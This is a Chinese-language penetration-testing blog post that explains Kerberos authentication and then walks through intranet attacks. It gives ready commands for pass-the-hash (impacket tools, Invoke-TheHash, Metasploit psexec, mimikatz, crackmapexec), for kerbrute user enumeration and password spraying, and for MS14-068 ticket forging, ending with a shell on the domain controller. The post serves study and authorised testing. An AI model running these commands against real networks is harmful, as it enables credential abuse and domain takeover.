---
draft: false
isCJKLanguage: true
date: 2022-10-11
lastmod: 2022-10-13
title: "Kerberos 与 NTLM Hash 与 Ticket"
description: 主要说下渗透测试中的内网协议 Kerberos，以及内网常见的金银票据漏洞
categories: 
  - Pentest
tags:
  - intranet
---


### 0x00 Kerberos
Kerberos 协议有两个基础认证模块: AS 和 TGS，以及微软扩展的两个认证模块 S4U 和 PAC。
常见的基于 Kerberos 协议攻击的方法如下图所示：
![60](/img/post/Xnip2022-10-13_17-09-29.png)

### 0x01 Kerberos 关键词
* 域控制器（Domain Controller，DC）：在域中至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样。
* 帐户数据库（Account Database，AD）：一个类似于 Windows 本机 SAM 的数据库，存储了域内所有网络对象的凭证，也存储所有 Client 的白名单，在白名单中的 Client 才可以申请到 TGT。
* 密钥分发中心（Key Distribution Center，KDC）：KDC 维护着域中所有安全主体（SecurityPrincipal）账户信息数据库，负责管理票据、认证票据、分发票据，在 Windows 域环境中，KDC 的角色由 DC 承担。
* 身份验证服务（Authentication Service，AS）：用于生成 TGT 的服务。
* 票据发放服务（Ticket Granting Service，TGS）：用于生成某个服务的 ticket
* 认证票据（Ticket Granting Ticket，TGT）：可以理解为入场券，通过入场券能够获得票据，是一种临时凭证的存在。
* 票据（Ticket）：网络对象互相访问的凭证。
* Session Key：AS 生成的随机会话密钥。
* Server Session Key：TGS 生成的随机会话密钥。
* krbtgt 账户：每个域控制器都有一个 krbtgt 的用户账户，是 KDC 的服务账户，用来创建票据授予服务(TGS)加密的密钥。

### 0x02 Kerberos 认证过程
认证的大致过程：
* Client 向 KDC 的 AS 服务发送请求，希望获取访问 Server 的权限。KDC 收到请求后，通过在帐户数据库 AD 中存储黑名单和白名单来区分 Client 是否可信。确认成功后，AS 返回 TGT 给 Client。 
* Client 得到了 TGT 后，继续向 KDC 的 TGS 服务发送请求，希望获取访问 Server 的权限。KDC 通过客户端请求信息中的 TGT 判断客户端是否拥有权限，确认成功返回访问 Server 的权限 ticket。
* Client 得到 ticket 后，Client 与 Server 二者进行相互验证，成功后，Client 就可以访问 Server 的资源。

详细认证过程：
![50](/img/post/Xnip2022-10-13_17-10-46.png)
* 1、AS-REQ 
    Client 携带：
    * 预认证数据(用户 NTLM Hash 加密的 Timestamp)
    * Client info(用户名、主机名等)等
    * KDC TGS 的 Server Name
* 2、AS-REP
    KDC 收到请求后，在 AD 中拿到对应用户的 Hash 对 Client 的预认证数据解密，能解密成功的话预认证通过

    AS 返回：
    * 一个被 Client Hash 加密过的 Session key
    * KDC 用户 krbtgt 用户的 NTLM Hash 加密后的 TGT(包含原始 Session key、TGT 到期时间、PAC 等)

    Client 收到 AS 的返回后会用自己的 NTLM Hash 解密密文 Session Key 得到原始的 Session Key，然后在本地缓存原始 Session Key 和 TGT

    <font color=red>注：如果我们能获取到 krbtgt 用户的 NTLM Hash 那就能自己制作 TGT，也就是黄金票据攻击</font>
* 3、TGS-REQ
    Client 携带：
    * Authenticator(原始的 Session Key 加密的 Clien info、Timestamp)
    * TGT
    * Client info：Domain name/Client
    * Client 要访问的 Server 的信息
* 4、TGS-REP
    通过 krbtgt 用户的 NTLM Hash 解密 TGT 并得到的原始 Session Key，然后通过原始的 Login Session Key 解密 Authenticator，如果解密成功，则验证了对方的真实身份

    TGS 返回：
    * 用原始的 Session Key 加密后的用于确保客户端-服务器之间通信安全的 Server Session Key
    * 用 Server 的 Hash 加密过的 ST 服务票据(包含 Client info、原始Server Session Key)

    Client 收到返回后通过缓存的原始 Session Key 解密得到原始 Server Session Key、ST 服务票据，然后缓存它们
    
    <font color=red>注：如果我们拥有服务账号的 NTLM Hash，我们可以自己签发该服务的 ST 票据，这个票据也被称为白银票据。有些服务并没有验证 PAC 是白银票据能成功的前提，因为就算攻击者拥有用户 hash，可以制作 ST 票据，也不能制作 PAC。相较于黄金票据，白银票据使用要访问服务的 hash，而不是 krbtgt 的 hash，由于生成的是 ST 票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。</font>
* 5、AP-REQ
    Client 携带：
    * ST 服务票据
    * Authenticator(Server Session Key 加密的 Client info 与 Timestamp）
* 6、AP-REP
    Server 收到 Client 发来的 ST 服务票据后，先通过该服务的 NTLM Hash 解密 ST 服务票据，并从中提取 Server Session Key，然后通过提取出来的 Server Session Key 解密 Authenticator，进而验证了客户端的真实身份

    验证了客户端的身份后，服务端拿着 PAC 去询问 KDC 该用户是否有访问权限。域控拿到 PAC 后解密，然后 KDC 通过 PAC 中的 SID 判断用户的用户组信息，用户权限等，然后将结果返回给服务端，服务端再将此信息与用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关服务。

### 0x03 PtH 哈希传递攻击
在 Windows 系统中，通常会使用 NTLM 进行身份认证，PtH 就是通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。

攻击范围：
* 在工作组环境中：
    * Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
    * Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。
* 在域环境中：
    * 只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器

可以传递 hash 的几个工具：
* 135 端口的 WMI 服务
    * impacket 内网渗透套件的 wmiexec.exe
        
        `wmiexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 Administrator@192.168.237.209`
    * Invoke-TheHash 脚本
        
        `Invoke-WMIExec -Target 192.168.237.209 -Username Administrator -Hash 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 -Command "whoami" -verbose`
* 445 端口的 SMB 服务
    * impacket 内网渗透套件的 psexec.exe
        
        `psexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 Administrator@192.168.237.209`
    * impacket 内网渗透套件的 mmcexec
        
        `mmcexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 Administrator@192.168.237.209`
    * impacket 内网渗透套件的 smbclient
        
        `smbclient.exe -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 Administrator@192.168.237.209`
    * impacket 内网渗透套件的 smbexec
        
        `python smbexec.py -hash esaad3b435b51404eeaad3b435b51404ee:0515322a55615056aaabb044a48463a4 rabbitmask@192.168.15.181`
        
        或者
        
        `python smbexec.py -hashes :0515322a55615056aaabb044a48463a4 rabbitmask@192.168.15.181`
    * Invoke-TheHash 脚本
        
        `Invoke-SMBExec -Target 192.168.237.209 -Username Administrator -Hash 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 -Command "whoami" -verbose`
    * Metasploit 中的 psexec
        
        ```
        use exploit/windows/smb/psexec
        set RHOST 192.168.237.209
        set SMBUser Administrator
        set SMBPass 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42
        exploit
        ```
    * mimikatz
        
        ```
        .\mimikatz
        sekurlsa:pth /user:目标机器用户名 /domain:目标机器IP /ntlm:本地获取的NTLM hash值
        ```
* 5985 端口 winrm 服务
    * crackmapexec
        
        `poetry run crackmapexec winrm 192.168.237.209 -u Administrator -H 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 -x whoami`

### 0x04 域用户枚举
在 [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases?_blank) 下载 kerbrute_windows_amd64.exe

首先我们需要获取 dc 的 ip、域名，然后攻击：  
kerbrute_windows_amd64.exe userenum --dc 192.168.111.134 -d yokan.com user.txt

枚举后可以进行密码喷洒攻击：  
kerbrute_windows_amd64.exe passwordspray -d yokan.com user.txt password

### 0x05 PtT 票据传递攻击
它是利用 Kerberos 协议进行攻击的，本质上使用了 ticket，经常听到的黄金票据和白银票据就是将票据注入内存从而访问服务的。

* 金银票据差异：
    ```
    认证流程不同
        金票：同 TGS 交互，但不同 AS 交互
        银票：完全不同 KDC 交互，直接访问 Server

    加密方式不同
        金票：由 krbtgt NTLM Hash 加密
        银票：由服务账号 NTLM Hash 加密

    获取的权限不同
        金票：伪造的 TGT，可以获取任意 Kerberos 的访问权限
        银票：伪造的 ST，只能访问指定的服务，如 CIFS
    ```

* 黄金票据  
在 Ticket 获取过程中，Client 与 KDC 两次通信得到对应 Server 资源的 Ticket。  
若攻击者已经获取 krbtgt 的 NTLM Hash 值时，可伪造自己的 TGT，而这个 TGT 就是常说的黄金票据。  
而我们拥有了黄金票据，就可以不用经过 AS 认证，直接向 TGS 服务请求 Ticket。
![40](/img/post/Xnip2022-10-13_17-11-20.png)

* 白银票据  
当攻击者拥有 Server NTLM Hash 时，可直接伪造一个 Ticket 与 Server 通信让其验证。
 ![40](/img/post/Xnip2022-10-13_17-11-42.png)

### 0x06 MS14-068
成因主要是 KDC 无法正确检查 Kerberos 票证请求随附的特权属性证书（PAC）中的有效签名，导致用户可以自己构造 PAC，另一点就是 PAC 被放在 TGS_REQ 数据包的其他地方也能够正确解析

* 利用条件：
    * 小于 2012R2 的域控 没有打 KB3011780，高版本默认集成
    * 无论工作组、域，高低权限都可以使用生成的票据进行攻击
    * 域账户使用时需要klist purge清除票据

* 工具：

    [https://github.com/mubix/pykek](https://github.com/mubix/pykek?_blank)
    [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits?_blank)
    [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket?_blank)

* 利用步骤：
    * systeminfo 查看未打 KB3011780
        ```
        systeminfo | findstr "3011780"
        wmic qfe GET hotfixid | findstr "3011780"
        ```

    * 获取 sid  
        使用 `whoami /user` 或者 `wmic useraccount get name,sid` 获取 sid

    * 生成票据  
        python ms14-068.py -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址  
        目录下会生成名为 “TGT_域成员名@域名.ccache” 的高权限票据

    * 清除内存中的票证  
        mimikataz# kerberos::purge

    * 导入票据  
        mimikataz# kerberos::ptc "TGT_域成员名@域名.ccache"

    * 利用  
        klist 查询票据是否导入成功  
        执行 `dir \\域控计算机全名\c$ 看能否访问`

    * 弹 shell  
        `psexec64.exe /accepteula /s \\域控ip cmd.exe`


#### Reference(侵删)：
* [https://www.bilibili.com/read/cv15702405/](https://www.bilibili.com/read/cv15702405/?_blank)
* [https://www.bbsmax.com/A/gAJGXX935Z/](https://www.bbsmax.com/A/gAJGXX935Z/?_blank)
* [http://t.zoukankan.com/bmjoker-p-10355979.html](http://t.zoukankan.com/bmjoker-p-10355979.html?_blank)
* [https://blog.csdn.net/m0_71692682/article/details/125217553](https://blog.csdn.net/m0_71692682/article/details/125217553?_blank)
* [https://blog.csdn.net/st3pby/article/details/123036917](https://blog.csdn.net/st3pby/article/details/123036917?_blank)
* [https://blog.csdn.net/nicai321/article/details/122614894](https://blog.csdn.net/nicai321/article/details/122614894?_blank)
